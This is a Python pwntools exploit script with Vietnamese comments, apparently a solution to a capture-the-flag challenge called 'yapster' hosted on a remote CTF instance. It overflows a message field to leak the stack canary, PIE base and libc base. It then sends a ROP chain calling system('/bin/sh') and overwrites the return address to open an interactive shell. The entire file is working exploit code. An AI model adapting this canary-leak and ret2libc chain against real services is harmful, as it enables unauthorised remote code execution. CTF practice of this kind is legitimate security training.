from pwn import *

exe = ELF('./yapster', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

# p = process(exe.path)
p = remote('yapster-8d8c3ae96a9fb94c.instancer.batmans.kitchen', 1337, ssl=True)

# ==========================================
# BƯỚC 1: LEAK CANARY, PIE, LIBC
# ==========================================
p.sendlineafter(b"> ", b"1")

# Gửi 1 chữ "A" vào messageBody
p.sendlineafter(b"> ", b"A")

# Overflow reciever để ép messageLen thành \xff
payload_leak = b"BigHippo85\x00".ljust(32, b"A") + b"B"*8 + b"\xff\n"
p.sendafter(b"> ", payload_leak)

p.sendlineafter(b"> ", b"2")
p.recvline() # Nuốt dòng From... và chữ "A\n"

leak = p.recv(150)

# Offset đã được trừ đi 2 do p.recvline()
canary = u64(leak[54:62])
log.success(f"Canary: {hex(canary)}")

pie_leak = u64(leak[86:94])
exe.address = pie_leak - 0x1771 # Offset trả về của readInbox trong hàm main
log.success(f"PIE Base: {hex(exe.address)}")

libc_leak = u64(leak[118:126])
libc.address = libc_leak - libc.sym['__libc_start_main'] - 243
log.success(f"Libc Base: {hex(libc.address)}")

# ==========================================
# BƯỚC 2: ROP CHAIN & TRIGGER OVERFLOW
# ==========================================
# Cập nhật gadget chuẩn từ binary của bạn
pop_rdi = exe.address + 0x1813 
ret = exe.address + 0x101a
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

p.sendlineafter(b"> ", b"1")

# Chuẩn bị ROP Chain sẵn ở messageBody
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendlineafter(b"> ", rop_chain)

# Bơm padding và Canary vào reciever để đè RIP thành ret
payload_overflow = b"A"*24 + p64(canary) + p64(0) + p64(ret)[:7]
p.sendafter(b"> ", payload_overflow)

p.interactive()